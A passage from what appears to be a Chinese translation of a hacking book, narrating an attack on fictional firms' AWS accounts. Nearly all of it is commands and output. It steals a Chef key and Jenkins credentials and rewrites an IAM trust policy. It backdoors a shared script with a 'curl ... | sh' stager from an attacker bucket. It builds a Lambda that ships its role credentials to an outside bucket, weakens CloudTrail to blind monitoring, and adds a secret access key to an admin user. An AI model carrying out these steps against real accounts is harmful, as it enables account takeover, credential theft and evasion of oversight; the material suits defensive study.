    --attribute userData \
    --region=eu-west-1 \
    | jq -r .UserData.Value | base64 -d)
  echo $userData > $p.txt
done <list_ids.txt
```

> 注意 `describe-instance-attribute` API 调用通常会在 `describe*` 策略下不经多想就被授予。如果被阻止，我们可以尝试获取自动扩缩组的启动配置，其中通常包含相同的数据：`aws autoscaling describe-launch-configurations` 或 `aws ec2 describe-launch-templates`。

我们检查创建了多少个文件并确认文件包含用户数据脚本：

```
root@Point1:~/# ls -l i-*.txt | wc -l
21
root@Point1:~/# cat i-08072939411515dac.txt
```

```
encoding: gzip+base64
  path: /etc/ssh/auth_principals/user
  permissions: "0644"
- content: |-
  #!/bin/bash
--snip--
```

完美。现在是真相时刻。这些精美的服务器中是否有任何一台在其用户数据中声明了 Chef 私钥？我们查找 `BEGIN RSA PRIVATE KEY` 关键词：

```
root@Point1:~# grep -7 "BEGIN RSA PRIVATE KEY" i-*.txt
--snip--
```

```
① cat << EOF
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
validation_client_name 'chef-validator'
EOF
) > /etc/chef/client.rb
```

```
② cat << EOF
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAg/6woPBdnwSVjcSRQenRJk0MePELfPp
--snip--
) > /etc/chef/validation.pem
```

几乎太容易了。第一段代码定义了 Chef 使用的关键参数并将其存储在 `client.rb` 文件中。第二段代码将私钥写入名为 `validation.pem` 的文件。

这个私钥与我们希望获得的不同，但我们会让它发挥作用。我们获得的密钥是验证密钥，即分配给实例以建立与 Chef 服务器首次联系的 `chef-validator` 用户的私钥。`chef-validator` 不允许列出机器、`cookbook` 或其他敏感操作，但它拥有注册客户端（机器）的终极权力，而这最终会授予它们可以执行所述操作的私钥。一切顺利。

该用户的私钥在所有希望加入 Chef 服务器的实例之间共享。因此，自然地，我们也可以用它来注册一台额外的机器并获得我们自己的私钥。我们只需要模仿一个真实客户端的配置，并在 VPC 内礼貌地向 Chef 服务器请求即可。

我们创建启动机器注册所需的文件——`client.rb` ① 和 `validation.pem` ②——并用从用户数据脚本中收集的数据填充它们，如下所示。这真的只是懒惰的复制粘贴：

```
meterpreter > execute -i -f cat << EOF
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
validation_client_name 'chef-validator'
EOF
) > /etc/chef/client.rb
```

```
meterpreter > execute -i -f cat << EOF
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqg/6woPBdnwSVjcSRQenRJkoMePELfPp
--snip--
> /etc/chef/validation.pem
```

我们随后从后门下载并执行 Chef 客户端，以启动我们机器的注册流程：

```
meterpreter > execute -i -f apt update && apt install -y chef
meterpreter > execute -i -f chef-client
Starting Chef Client, version 14.8.12
Creating a new client identity for aws-node-78ec.eu-west-1.compute.internal using the validator key.
Synchronizing Cookbooks:
Installing Cookbook Gems:
Compiling Cookbooks...
Running handlers complete
Chef Client finished, 0/0 resources updated in 05 seconds
meterpreter > ls /etc/chef/
client.pem client.rb validation.pem
```

就这样。我们完成了。我们将一台新机器偷运进了 Chef 服务器的目录中，并获得了一个名为 `client.pem` 的新私钥。

`chef-client` 可执行文件处理机器的状态，包括应用相关 `cookbook`、注册机器等。要探索 Chef 服务器上定义资源，我们需要使用 `knife` 工具。这是 Chef 标准包的一部分，但它需要一个小配置才能正常运行。以下是一个示例配置文件，基于之前执行的 `chef-client` 命令的输出（用于检索机器名称）以及 `client.rb` 配置：

```
# ~/root/.chef/knife.rb
node_name      'aws-node-78ec.eu-west-1.compute.internal'
client_key     '/etc/chef/client.pem'
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
knife[:editor] = '/usr/bin/vim'
```

配置好 `knife` 后，让我们用它来列出 Chef 服务器的 `cookbook` 目录：

```
meterpreter > knife cookbooks list
apt                7.2.0
ark                4.0.0
build-essential    8.2.1
jenkins-ci         10.41.5
--snip--
```

太棒了，我们亲爱的 `jenkins-ci` cookbook 在这里。让我们更仔细地查看该 cookbook 的版本历史：

```
meterpreter > knife cookbooks show jenkins-ci
10.9.5 10.9.4 10.9.4 10.9.3 10.9.2 10.9.1 10.9.8 10.9.7...
4.3.1 4.3.0 3.12.9 3.11.8 3.11.7 3.9.3 3.9.2 3.9.1
```



我们可以看到，这个狡猾的 Chef 服务器保留了超过 50 个版本的此 cookbook，从 10.9.5 一直到 3.9.1。现在我们需要找到最近带有明文凭据的 cookbook——理想情况下是在切换到 KMS 之前。

我们开始检查不同版本，从最新版本开始，经过几次尝试后，我们找到了 cookbook 版本 10.8.6：

```
meterpreter > knife cookbooks show jenkins-ci 10.8.6
```

```
attributes:
  checksum:     320a841cd55787adecbdef7e7a5f977de12d30
  name:         attributes/secrets.rb
  url:          https://chef.mxrads.net:443/bookshelf/organization-26cbb e406c5e38edb28008b00774500/checksum-320a841cd55787adecbdef7e7a5f977de12d30?AWSAccessKeyId=25ecce65728a2006d6e4b f782ee0a5087662119&Expires=1576042810&Signature=j9jazxrJjPkHQNGtZqr1Azu%2BP24%3D
--snip--
meterpreter > curl https://chef.mxrads.net:443/bookshelf/org...
```

```
'AWS_JENKINS_ID' => 'AKIA55ZRK6ZS2XX5QQ4D',
'AWS_JENKINS_SECRET' => '6yHF+L8+u7g7RmHcud1CqWIgOSchgT',
--snip--
```

天哪，我们找到了！Jenkins 自己的 AWS 访问密钥以明文形式存在①。如果这个小家伙不是 AWS 账户的管理员，我不知道谁是。

在列表 10-7 中，我们串联了几个 AWS API 调用，以获取与这些凭据关联的 IAM 用户名、其附加策略、它们的最新版本，最后是它们的内容。

```
root@Point1:~# vi ~/aws/credentials
[jenkins]
aws_access_key_id = AKIA55ZRK6ZS2XX5QQ4D
aws_secret_access_key = 6yHF+L8+u7g7RmHcud1CqWIgOSchgT
# get username
root@Point1:~# aws iam get-user --profile jenkins
"UserName": "jenkins"
# list attached policies
root@Point1:~# aws iam list-attached-user-policies \
  --user-name=jenkins \
  --profile jenkins
"PolicyName": "jenkins-policy",
"PolicyArn": "arn:aws:iam::886371554408:policy/jenkins-policy"
```

```
# get policy version
root@Point1:~# aws iam get-policy \
--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \
--profile jenkins
"DefaultVersionId": "v4",
# get policy content
root@Point1:~# aws iam get-policy-version \
--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \
--version v4 \
--profile jenkins
--snip--
"Action": [
  "iam:*",
  "ec2:*",
  "sts:*",
  "lambda:*",
  ...
  ],
  "Resource": "*"
--snip--
```

列表 10-7：检索授予 Jenkins 账户的访问权限

看看策略输出中所有那些星号。星号。星号到处都是。字面意思。Jenkins 可以访问 MXR Ads 使用的每个 AWS 服务，从 IAM 到 Lambda 等。我们最终完全且无可争议地控制了 MXR Ads 的 AWS 账户。

注意 在此场景中，我们选择利用 EC2 来控制管理工具，但其他选项也是可能的：探索 S3 中的 cookbook、Jenkins 备份、Terraform 状态、VPN 账户等等。GitHub 仓库、DynamoDB 文档和其他服务也是如此。

## 接管 Lambda

我们回到最初引发这次旁支冒险的目标：冒充附加到 Lambda 函数 `dmp-sync` 的 IAM 角色，该函数将数据复制到 Gretsch Politico。

现在我们对 IAM 服务拥有无限访问权限，让我们探索这个 Lambda 的角色（参见列表 10-8）。

```
root@Point1:~# export AWS_PROFILE=jenkins
root@Point1:~# aws iam get-role lambda-dmp-sync
"RoleName": "dmp-sync",
"Arn": "arn:aws:iam::886371554408:role/dmp-sync",
"AssumeRolePolicyDocument": {
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
```

```
    "Service": "lambda.amazonaws.com"
},
    "Action": "sts:AssumeRole"
}]
--snip--
```

### 列表 10-8：lambda-dmp-sync 角色的 IAM 角色策略

`AssumeRolePolicyDocument` 属性指定哪些实体被允许冒充给定角色。请注意，唯一被信任承担此角色的实体就是 AWS Lambda 服务本身（`lambda.amazonaws.com`）。要正确冒充此角色，我们需要注册一个新的 Lambda，为其分配此新角色，并执行我们喜欢的任何代码。或者，我们也可以更新当前 Lambda 的代码以按我们的意愿执行。

第三个选项，也是可能最简单的选项，是临时更新角色的策略以包含 Jenkins 用户。此更改不能持续，因为在那个精确时间窗口内执行 `terraform plan` 的任何人都会注意到额外的账户并可能会产生怀疑。因此，我们需要迅速行动。我们将更改“assume role”策略，生成有效期 12 小时的临时凭据，然后恢复到原始策略。进出不到一秒。

在列表 10-9 中，我们将当前角色策略保存到文件中，并偷偷加入一行 `"AWS": "arn:aws:iam::886371554408:user/jenkins"` 以将 Jenkins 添加为受信任用户。

```
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Service": "lambda.amazonaws.com",
      "AWS": "arn:aws:iam::886371554408:user/jenkins"
    },
    "Action": "sts:AssumeRole"
  }]
}
```

### 列表 10-9：允许 Jenkins 冒充 Lambda 使用的 IAM 角色的 IAM 角色策略

我们提交此新角色策略并迅速发出 `assume-role` API 调用，以获取冒充 `lambda-dmp-sync` 角色的临时凭据：

```
root@Point1:~# aws iam update-assume-role-policy \
--role-name lambda-dmp-sync \
--policy-document file://new_policy.json
root@Point1:~# aws sts assume-role \
--role-arn arn:aws:iam::886371554408:user/lambda-dmp-sync \
--role-session-name AWSCLI-Session \
--duration-seconds 43200
```

```
"AccessKeyId": "ASIA4A4ZRK6WSZAFXRBQF",
"SecretAccessKey": "nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC",



"SessionToken": "FwoGZXIVYXdZEL///..."

"Expiration": "2019-12-12T10:31:53Z"

```
很好。这些临时凭据将保持有效 12 小时，即使 Jenkins 已不再在信任策略中。最后，我们恢复原始策略以避免任何怀疑：
```

```
root@Point1:~# aws iam update-assume-role-policy \
--role-name lambda-dmp-sync \
--policy-document file://old_policy.json\
--profile jenkins
```

> 我们稍后将关注 AWS 中的内置警报和检测措施，但由于 MXR Ads 似乎使用 Jenkins 发出 IAM API 调用，可以安全地假设此类操作会被日常噪音淹没。

我们将新密钥加载到 AWS CLI 中，并继续探索 Gretsch Politico 的存储桶 `gretsch-streaming-jobs`（列表 10-10）。这正是 `dmp-sync` Lambda 使用的同一个存储桶，正如我们在本章前面发现的那样。

```
root@Point1:~# vi ~/.aws/credentials

[dmp-sync]

aws_access_key_id = ASIA4A4ZRK6WSZAFXRBQF

aws_secret_access_key = nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC

aws_session_token = FwoGZXIVYXdZEL/...

root@Point1:~# aws s3api list-objects-v2 \
--bucket gretsch-streaming-jobs \
--profile dmp-sync > list_objects_gp.txt

root@Point1:~# head list_objects_gp.txt

"Key": "rtb-bid-resp/2019/12/11/10/resp-0-141d08-ecedade-123...",
"Key": "rtb-bid-resp/2019/12/11/10/resp-0-753a10-3e1a3cb-51c...",
"Key": "rtb-bid-resp/2019/12/11/10/resp-1-091bd8-135eac7-92f...",
"Key": "rtb-bid-resp/2019/12/11/10/resp-1-3f1cd8-dae14d3-1fd...",
--snip--
```

*列表 10-10：存储在 `gretsch-streaming-jobs` 存储桶中的对象列表*

MXR Ads 似乎在向 GP 提供竞价响应，告诉他们在给定网站上向给定 cookie ID 显示了哪个视频。还有其他关键指标，奇怪的是，许多公司会将其视为敏感材料，例如每个竞价请求的原始日志、其他客户的活动数据……等等。

The `gretsch-streaming-jobs` bucket is truly huge. It contains terabytes of raw data that we simply cannot process, nor do we wish to. GP is better equipped to do that. We’d better follow this trail of breadcrumbs and hope it leads us to the final cake.

在这样一个巨大的数据湖中，隐藏在极具诱惑力的 `helpers` key 下，我们发现了一些几周前才被修改过的可疑可执行文件：

```
"Key": "helpers/ecr-login.sh",
"LastModified": "2019-11-14T15:10:43.000Z",
"Key": "helpers/go-manage",
"LastModified": "2019-11-14T15:10:43.000Z",
--snip--
```

有趣。这里我们有很可能在 GP 拥有和运营的机器上执行的可执行对象。这很可能就是进入 Gretsch Politico AWS 账户的门票。我们的 Lambda 角色按定义可以写入 `gretsch-streaming-jobs` bucket。问题是，GP 是否足够精明，只将 Lambda 限制在 `rtb-bid-resp` 子键上？让我们测试一下：

```
root@Point1:~/# aws s3api put-object \
--bucket gretsch-streaming-jobs \
--key helpers/test.html --body test.html \
--profile dmp-sync

"ETag": "\"051aa2040dafb7fa525f20a27f5e8666\""
```

没有错误。各位，这可以视为越境的邀请！这些辅助脚本很可能被 GP 资源获取并执行。如果我们篡改它们，就能劫持执行流程并调用我们自定义的 stager，从而在 GP 组件上获得一个新的 shell！

我们下载 `helpers/ecr-login.sh`，附加一条执行我们自定义 meterpreter stager 的命令，然后重新提交文件。像往常一样，stager 将托管在我们自己的 AWS 账户中另一个伪造的 bucket `gretsch-helpers` 中：

```
root@Point1:~/# aws s3api get-object \
--bucket gretsch-streaming-jobs\
--key helpers/ecr-login.sh ecr-login.sh \
--profile dmp-sync

root@Point1:~/# echo "true || curl https://gretsch-helpers.s3.amazonaws.com/helper.sh |sh" >> ecr-login.sh

root@Point1:~/# aws s3api put-object \
--bucket gretsch-streaming-jobs \
--key helpers/ecr-login.sh \
--body ecr-login.sh \
--profile dmp-sync
```

现在我们等待。我们等待几个小时。我们等待某个人在某个地方触发我们的 payload，如果有的话。毕竟，我们没有任何保证 *ecr-login* 辅助脚本确实会被使用。我们甚至懒得检查它到底做了什么。无论如何，现在已经太晚了。让我们祈祷一切顺利。

### 资源

- AWS STS 的文档位于 https://amzn.to/38j05GM。
- 有关 AWS Lambda 强大功能的更多信息，请参阅 Kelsey Hightower（Google 员工）在 KubeCon 2018 上展示的演讲“Kubernetes and the Path to Serverless”：http://bit.ly/2RtothP。（没错，你读对了——他在 Google 工作。）

## 11

## 然而，我们坚持了下去

![](img/961e81aef23040d0fbe348f58c055860_207_0.png)

在等待我们的 shell 回连的同时，有一项小任务需要我们立即关注：AWS 持久化。有人可能会争辩说 Jenkins 的访问密钥已经提供了我们所需的所有持久性，因为访问密钥通常难以轮换，并且需要审查数百个作业以查找潜在的硬编码凭据。它是任何 DevOps 基础设施中如此关键的一部分，以至于讽刺地屈服于 DevOps 如此傲慢地反对的同样的谬误——最近的证明就是我们从 Chef 获取的凭据仍然在使用中。

尽管如此，在等待 GP 机器上的 shell 的同时我们还有一些空闲时间，所以让我们加强对 MXR Ads 的控制。

## AWS 哨兵

对 AWS 账户进行后门操作可能是一个微妙的过程，涉及在充满监控工具和敏感警报的险恶海洋中航行。AWS 已做出相当大的努力，向其客户提供各种可疑活动指标以及其认为不安全的配置。

在盲目攻击或对账户进行后门操作之前，有两个 AWS 功能特别需要注意：IAM Access Analyzer 和 CloudTrail Insights。

IAM Access Analyzer 会标记每个向外部实体授予读写权限的策略文档。它最显著地涵盖 S3 bucket、KMS 密钥、Lambda 函数和 IAM 角色。推出时，该功能扼杀了一种非常隐蔽的持久化策略：在受害者账户中创建管理员角色并向外部（我们自己的）AWS 账户授予 assume-role 权限。

我们可以快速检查 `eu-west-1` 区域是否生成了任何 Access Analyzer 报告：

```
root@Point1:~# aws accessanalyzer list-analyzers --region=eu-west-1

{ "analyzers": [] }
```



MXR Ads 尚未利用此功能，但我们不能将持久化策略押注于公司对可能只需一次点击就能暴露我们后门的此功能的无知之上。

CloudTrail 是 AWS 的一项服务，以 JSON 格式记录几乎所有 AWS API 调用，并可选择将其存储在 S3 上和/或转发到 CloudWatch 等其他服务以配置指标和警报。列表 11-1 是 IAM 调用创建管理员用户访问密钥的示例事件。该事件包含任何威胁分析师必不可少的信息：源 IP 地址、调用者身份、事件来源等等。

# Sample CloudTrail event creating an additional access key

```json
{
    "eventType": "AwsApiCall",
    "userIdentity": {
        "accessKeyId": "ASIA4ZRK6WS32PCYCHY",
        "userName": "admin"
    },
    "eventTime": "2019-12-29T18:42:47Z",
    "eventSource": "iam.amazonaws.com",
    "eventName": "CreateAccessKey",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "215.142.61.44",
    "userAgent": "signin.amazonaws.com",
    "requestParameters": { "userName": "admin" },
    "responseElements": {
        "accessKey": {
            "accessKeyId": "AKIA4ZRK6WSRDLX7TDS",
            "status": "Active",
            "userName": "admin",
            "createDate": "Dec 29, 2019 6:42:47 PM"
        }
    }
}
```

*列表 11-1：CloudTrail CreateAccessKey 事件*

不得不承认 AWS 让日志事件如此直观。MXR Ads 拥有覆盖所有区域的全球性和全面性日志策略，如列表 11-2 所示。

```
root@Point1:~/# aws cloudtrail describe-trails --region=eu-west-1
"traillist": [{
  "IncludeGlobalServiceEvents": true,
  "Name": "Default",
  "S3KeyPrefix": "region-all-logs",
  "IsMultiRegionTrail": true,
  "HasInsightSelectors": true,
  "S3BucketName": "mxrads-cloudtrail-all",
  "CloudWatchLogsLogGroupArn": "arn:aws:logs:eu-west-1:886371554408:log-group:CloudTrail/Logs:*",
  ...
}]
```

*列表 11-2：CloudTrail 上将日志转发到 CloudWatch 和 S3 的 trail 配置*

日志被转发到 S3 bucket `mxrads-cloudtrail-all` ②。我们从标志 `HasInsightSelectors` ① 看出 MXR Ads 正在试验一个名为 Insights 的 CloudTrail 功能，该功能检测 API 调用的激增并将其标记为可疑事件。截至目前，它仅报告写入 API 调用，如 `RunInstance`、`CreateUser`、`CreateRole` 等。我们仍然可以对只读和侦察调用为所欲为，但一旦我们开始自动化用户账户创建，例如，我们必须小心不要触发 CloudTrail Insights 设定的动态阈值。

这两个功能（CloudTrail Insights 和 IAM Access Analyzer）补充了其他现有服务，如 GuardDuty，后者监视可疑事件，例如禁用安全功能（CloudTrail）以及与已知不良域通信。我们可以使用以下命令检查 GuardDuty 在给定区域是否已启用：

```
root@Point1:~/# aws guardduty list-detectors --region=eu-west-1
{ "DetectorIds": [ "64b5b4e50b86d0c7068a6537de5b770e" ] }
```

即使 MXR Ads 忽略了所有这些新颖功能，CloudTrail 也是如此基础的组件，以至于几乎每家公司默认都已启用。我们可以清空存储 CloudTrail 数据的 S3 bucket，但日志仍将在 CloudTrail 本身中至少保留 90 天。

每当日志如此容易获取且有用时，谨慎的做法是假设最坏的情况：监控仪表板跟踪 API 调用、IP地址、调用的服务类型、对高度特权服务的异常查询等等。

压轴的还有：Terraform。我们知道 MXR Ads 依赖 Terraform 来维护其基础设施。如果我们手动更改错误的资源，在下一次 `terraform plan` 命令中就会像个明显的疤痕一样显眼。主题为“您已被入侵”的邮件反而可能更容易不被注意。

这些是与 AWS 账户交互时需要牢记的主要陷阱。它们确实是地雷，稍有失误就会爆炸。这几乎让你怀念起旧时光——入侵 Windows Active Directory 的日子，当时从一台机器上聚合和解析事件日志的工作需要两天时间。

现在，如果你处于目标方安全非常薄弱的情况，并且觉得可以手动创建几个访问密钥、添加几个看似可信的 IAM 用户并赋予他们管理员权限，请随意。在这种情况下没有必要过度设计后门策略，尤其是考虑到 Jenkins 的访问密钥相当稳定。

然而，如果公司看起来过于偏执——访问控制严格、权限严格且有限、活跃用户列表干净，并且 CloudTrail、CloudWatch 以及其他监控工具配置得当——你可能需要一个更稳健、更隐蔽的备份策略。

为了举例说明，让我们给 MXR Ads 一个有利的假设并假定最坏的情况。我们如何在不引起注意的情况下维持持久访问？

## 在极致隐秘中保持持久

我们的后门策略将遵循最时髦的设计架构，并且完全无服务器且事件驱动。我们将配置一个看门狗，在特定事件触发时启动，并触发一个作业，在检测到这些事件时重新建立我们的访问。

换成 AWS 术语来说，看门狗将由 Lambda 函数构成，该函数由我们选择的事件触发。例如，我们可以选择一个每天上午 10 点触发的 CloudWatch 事件，或接收预定义请求的负载均衡器。我们选择使用在 S3 存储桶接收新对象时触发的事件。MXR Ads 和 GP 都使用相同的触发器，因此我们有更高的机会融入其中。一旦执行，Lambda 将转储其附加的角色凭证并发送到我们自己的 S3 存储桶。我们收到的凭证有效期为一小时，但拥有足够的权限来永久恢复持久访问。

> NOTE
*更性感的做法是将我们的 Lambda 绑定到 CloudWatch 事件，该事件在 Jenkins 访问密钥轮换时触发。不幸的是，每个日志组只能设置一个目标 Lambda，并且它在 CloudWatch 仪表板中立即可见。将钩子接入 S3 的优势在于信息被埋藏在 S3 的仪表板内部。*

让我们回顾一下我们的检测清单：Lambda 函数将由某些频繁发生的内部事件触发（在本例中，当对象上传到 MXR Ads 的 S3 存储桶时），作为响应，它将执行一个相当无聊的 `put-object` 调用，将包含其凭证的文件存放在远程存储桶中。IAM Access Analyzer 几乎不会眨眼。

Terraform 在设置阶段不会大喊大叫，因为大多数资源将被创建，而不是更改。即使源存储桶已在状态中声明，技术上我们将添加一个 `aws_s3_bucket_notification` 资源，这在 Terraform 中是一个完全独立的实体。我们所要做的就是选择一个没有 Terraform 化通知设置的存储桶，我们就万事俱备了。

至于 CloudTrail，它记录的唯一事件是受信任的服务 `lambda.amazonaws.com` 冒充角色以执行 Lambda。这是一个任何 Lambda 执行固有的微不足道事件，将不会被 Insights 和 GuardDuty 注意到。

一切看起来都很正常！

## 要执行的程序

让我们进入实现阶段。Lambda 将运行的程序是一个直接的 Go 二进制文件，遵循前面描述的关键步骤。完整的实现可在本书仓库中获得 (`http://bit.ly/2Oan7I7`)，以下是主要逻辑的简要概述。

每个要在 Lambda 环境中运行的 Go 程序都从相同的样板 `main` 函数开始，该函数注册 Lambda 的入口点（本例中为 `HandleRequest`）：

```
func main() {
```



`lambda.Start(HandleRequest)`

}

接下来，我们有一个经典的设置来构建 HTTP 客户端并创建用于提交响应的远程 S3 URL：

```
const S3BUCKET="mxrads-analytics"

func HandleRequest(ctx context.Context, name MyEvent) (string, error) {

    client := &http.Client{}

    respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/setup.txt", S3BUCKET)

```

我们从环境变量中转储 Lambda 的角色凭证并将其发送到我们的远程存储桶：

```
accessKey := fmt.Sprintf(`
    AWS_ACCESS_KEY_ID=%s
    AWS_SECRET_ACCESS_KEY=%s
    AWS_SESSION_TOKEN=%s`,
    os.Getenv("AWS_ACCESS_KEY_ID"),
    os.Getenv("AWS_SECRET_ACCESS_KEY"),
    os.Getenv("AWS_SESSION_TOKEN"),
)

uploadToS3(s3Client, S3BUCKET, "lambda", accessKey)
```

`uploadToS3` 方法是对之前定义的 URL 的简单 PUT 请求，因此其实现从阅读源代码来看应该相当明显，总体上大约有 44 行长。

我们编译代码然后压缩二进制文件：

```
root@Point1:lambda/# make
root@Point1:lambda/# zip function.zip function
```

现在我们把注意力转向设置 Lambda。

## 构建 Lambda

Lambda 需要一个执行角色，该角色具有强大的 IAM 和 CloudTrail 权限，以帮助我们维持隐蔽的长期访问（稍后会详细介绍）。

我们寻找可以与 Lambda AWS 服务冒充的有希望的候选者。记住，要冒充一个角色，必须满足两个条件：用户必须能够发出 `sts assume-role` 调用，并且该角色必须接受来自该用户的冒充。我们列出 MXR Ads AWS 账户中可用的角色：

```
root@Point1:~/# aws iam list-roles \
| jq -r '.Roles[] | .RoleName + ", " + \
.AssumeRolePolicyDocument.Statement[].Principal.Service' \
| grep "lambda.amazonaws.com"

dynamo-access-mgmt, lambda.amazonaws.com
chef-cleanup-ro, lambda.amazonaws.com
--snip--
```

我们检查每个角色的 IAM 策略，直到找到我们需要的权限集的角色——理想情况下是完整的 IAM 和 CloudTrail 访问权限：

```
root@Point1:~/# aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins
"AttachedPolicies": [
    "PolicyName": "IAMFullAccess",
    "PolicyName": "cloudtrail-mgmt-rw",
    "PolicyName": "dynamo-temp-rw",
--snip--
```

`dynamo-ssh-mgmt` 角色可能可以胜任，因为它具有 `IAMFullAccess` 策略。Cheeky。如果我们从头开始在 MXR Ads 的 AWS 账户中创建自己的角色，我们绝不敢附加如此明显的策略。然而，既然他们已经在使用它，我们不妨利用它。此外，该角色缺乏 CloudWatch 写入权限，因此 Lambda 在终止时将静默丢弃其执行日志，而不是将其传递给 CloudWatch。完美。

像往常一样，我们通过坚持现有的命名约定来隐藏在众目睽睽之下。我们查找 `eu-west-1` 区域中现有的 Lambda 函数以获取灵感：

```
root@Point1:~/# aws lambda list-functions -region=eu-west-1
"FunctionName": "support-bbs-news",
"FunctionName": "support-parse-logs",
"FunctionName": "ssp-streaming-format",
--snip--
```

我们将选择名称 `support-metrics-calc` 并调用 `create-function` API 来注册我们的后门 Lambda：

```
root@Point1:~/# aws lambda create-function --function-name support-metrics-calc \
--zip-file fileb://function.zip \
--handler function \
--runtime go1.x \
--role arn:aws:iam::886371554408:role/dynamo-ssh-mgmt \
--region eu-west-1
```

现在是触发事件本身。

## 设置触发事件

理想情况下，我们希望定位一个由 MXR Ads 定期更新的 S3 存储桶，但更新频率不要太高，以至于每天触发 Lambda 1000 次。

> NOTE
> 我们选择在 MXR Ads 使用的同一区域创建 Lambda，但同样可以将其偷运到未使用的区域。这个 Lambda 几乎不花费任何费用，因此即使在账单报告上也几乎不会被注意到。

如何考虑 `s4d.mxrads.com`，即我们在第 8 章中查看的所有创意存储桶？一次快速的 `list-objects-v2` API 调用显示更新速度相对较低，每天大约 50 到 100 个文件：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt
"Key": "2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4",
"LastModified": "2019-12-14T11:01:48.000Z",
--snip--
root@Point1:~/# grep -c "2020-12-14" list_keys.txt
89
root@Point1:~/# grep -c "2020-12-13" list_keys.txt
74
--snip--
```

我们可以通过对触发通知事件的对象进行采样来降低触发率。我们将使其仅当对象键名以 "2" 开头时才触发我们的 Lambda，给出 1/16 的采样率（假设十六进制键空间，均匀分布）。这大约相当于每天三次到六次调用。
成交。

我们明确允许 S3 服务调用我们的 Lambda 函数。`statement-id` 参数是一个任意的、唯一的名称：

```
root@Point1:~# aws lambda add-permission \
--function-name support-metrics-calc \
--region eu-west-1 \
--statement-id s3InvokeLambda12 \
--action "lambda:InvokeFunction" \
--principal s3.amazonaws.com \
--source-arn arn:aws:s3:::s4d.mxrads.com \
--source-account 886371554408 \
--profile jenkins
```

然后，我们设置仅在创建以 "2" 前缀开头对象时触发事件的存储桶规则：

```
root@Point1:~# aws s3api put-bucket-notification-configuration \
--region eu-west-1 \
--bucket mxrads-mywebhook \
--profile jenkins \
--notification-configuration file://<(cat << EOF
{
    "LambdaFunctionConfigurations": [{
        "Id": "s3InvokeLambda12",
        "LambdaFunctionArn": "arn:aws:lambda:eu-west-1:886371554408
:function:support-metrics-calc",



```json
"Events": ["s3:ObjectCreated:*"],

"Filter": {

    "Key": {

        "FilterRules": [{

            "Name": "prefix",

            "Value": "2"

        }]

    }

}

}]

}

EOF

)
```

太棒了。我们拥有一种坚实的持久化策略，可以绕过旧的和新的检测功能。

现在假设我们的 Jenkins 访问权限以某种方式被撤销，并且我们希望使用 Lambda 凭证重新建立永久访问权限。我们是否应该直接创建一个具有无限权限的新 IAM 用户然后继续生活？这不是最明智的做法。任何基于 CloudTrail 的监控解决方案都可能在几分钟内发现这种异常请求。

如我们之前所见，当前的 CloudTrail 配置将所有区域的日志汇总到 `eu-west-1` 一个区域。日志随后被推送到 S3 和 CloudWatch，在那里可以被监控设备消费。这种事件转发功能称为 `trail`。

在调用任何 IAM 操作之前，我们需要破坏这个 `trail`。

## 掩盖我们的踪迹

注意我们的意图不是禁用日志记录，而是破坏 `trail` 本身。事实上，目前完全禁用 CloudTrail 或使其跳过事件是不可能的。不管我们做什么，我们的 API 调用仍将在接下来的 90 天内在 CloudTrail 事件仪表板中可见。

然而，`trail` 可以重新配置以省略转发某些事件。它甚至可以在我们执行恶劣任务时使整个区域变黑。

没有 `trail` 就意味着 S3 上没有日志，没有 GuardDuty，没有 CloudTrail Insights，没有 CloudWatch 指标，也没有自定义安全仪表板。就像多米诺骨牌一样，AWS 内部和外部的所有监控工具都将在令人震耳欲聋的寂静中一个接一个地倒下。我们可以添加 100 个 IAM 用户或在圣保罗启动 1,000 台实例，而没有人会注意到任何事情，也许除了会计部门。

> 注意 GuardDuty 在启用 VPC 日志时仍会监控并报告异常网络流量，但没有什么能阻止我们使用 AWS API。

这里有一个快速示例，展示如何重新配置 `trail` 以排除全局（IAM、STS 等）和多区域事件：

```
root@Point1:~# curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda

AWS_ACCESS_KEY_ID=ASIA44ZRK6WSTGTH5QLH

AWS_SECRET_ACCESS_KEY=1vMoXxF9TjF2oMNEmu...

AWS_SESSION_TOKEN=IQoJb3JpZ2luXv2jEPT...

# We load these ENV variables, then disable CloudTrail global and multiregion logging

root@Point1:~# aws cloudtrail update-trail \
  --name default \
  --no-include-global-service-events \
  --no-is-multi-region \
  --region=eu-west-1
```

```
"Name": "default",

"S3BucketName": "mxrads-cloudtrail-logs",

"IncludeGlobalServiceEvents": false,

"IsMultiRegionTrail": false,

--snip--
```

从这一刻起，我们可以自由创建用户和访问密钥，并进行各种胡闹。如果我们极其粗心，手动浏览 CloudTrail 仪表板的人可能会发现我们的 API 调用，但所有自动化解决方案和工具都将处于黑暗中。

## 恢复访问

现在我们已禁用 CloudTrail，可以继续创建更永久的 AWS 凭证集。

与默认管理员策略关联的用户和组很容易成为猎物。IAM 用户最多只能拥有两个访问密钥，因此我们找到一个拥有一个或零个访问密钥的用户，并为其注入一个额外的密钥，我们将秘密拥有它。首先，我们列出用户和组：

```
root@Point1:~# aws iam list-entities-for-policy \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess

UserName: b.daniella

UserName: chris.hitch

UserName: d.ressler

--snip--
```

然后我们列出他们当前定义的访问密钥：

```
# List access keys. If they have less than 2, there's room for another.

root@Point1:~# aws iam list-access-keys \
--user b.daniella \
| jq ".AccessKeyMetadata[].AccessKeyId"

"AKIA44ZRK6WS2X5Q0Q4X"
```

太好了，`b.daniella` 只有一个密钥。在确定目标后，我们创建一个访问密钥：

```
root@Point1:~# aws iam create-access-key --user b.daniella

UserName: b.daniella,

